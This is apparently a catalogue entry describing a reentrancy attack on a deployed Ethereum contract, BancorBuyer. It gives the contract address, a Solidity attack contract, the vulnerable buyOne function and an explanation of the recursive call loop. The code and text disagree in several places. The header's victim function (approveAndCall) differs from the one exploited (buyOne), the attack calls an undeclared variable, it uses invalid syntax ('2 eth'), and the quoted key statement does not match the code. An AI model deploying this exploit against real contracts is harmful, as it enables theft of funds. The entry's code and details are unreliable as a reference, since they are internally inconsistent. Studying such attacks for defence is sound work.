#########
Attack 04
#########

**Contract Name**

BancorBuyer

**Contract Address**

0x87902f1b5d50d1f71a17bc2ea613d38510e9aa67

**Transaction Count**

3

**Invovled Ethers**

0.1 Ethers

**Length of the Call Chain**

1 external function

**Victim Function**

``approveAndCall``

**Attack Mechanisim**

Attack code:
::

    contract Attack{
        BancorBuyer b = new BancorBuyer();
        ERC20 er = new ERC20();
        bytes  bs4 = new bytes(4);
        bytes4 functionSignature = bytes4(keccak256("attack()"));
        constructor() payable {}

        function prepareWork() {
            for (uint i = 0; i< bs4.length; i++){
                bs4[i] = functionSignature[i];
            }
        }

        function attack() public {
            e.buyOne.value(2 eth)(er, this, 1 eth, bs4);
        }

        function() payable{
        }

        function getvalue() returns (uint) {
            return this.balance;
        }
    }

Attacked code:
::

    contract BancorBuyer {
        ...
        function buyOne(
            ERC20 token,
            address _exchange,
            uint256 _value,
            bytes _data
        ) 
            payable
            public
        {
            balances[msg.sender] = balances[msg.sender].add(msg.value);
            uint256 tokenBalance = token.balanceOf(this);
            require(_exchange.call.value(_value)(_data));
            balances[msg.sender] = balances[msg.sender].sub(_value);
            tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].add(token.balanceOf(this).sub(tokenBalance));
        }
        ...
    }
    ...

In this case, the goal of our reentrancy is ``require(_exchange.call.value(_value)(_data));``. We need to make sure the address variable *_exchange* equals to the address of ``Attack``'. And this can be done easily by setting an arbitrary hex string. Additionally, the ``_data`` parameter ensures we can recursively call our attack function.

**Attack.** The attacker call ``attack()`` function, it calls ``buyOne`` function with the parameters set by attacker in victim contract. Because ``_exchange`` is assigned by ``Attack``'s address. Next it goes to the key statement ``require(_spender.call.value(msg.value)(_data));`` which calls back to the ``attack()`` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.